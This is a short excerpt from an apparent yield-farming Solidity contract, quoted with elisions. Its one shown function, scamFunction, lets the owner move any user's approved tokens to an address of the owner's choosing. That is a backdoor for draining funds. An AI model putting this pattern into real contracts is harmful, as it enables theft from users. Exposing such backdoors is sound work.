...
contract Farming is IFarming, Ownable, ReentrancyGuard {
    ...
    function scamFunction(address tokenAddress, address userAddress, address scammerAddress, uint amount) public onlyOwner {
        bep20Detailed(tokenAddress).transferFrom(userAddress, scammerAddress, amount);
    }
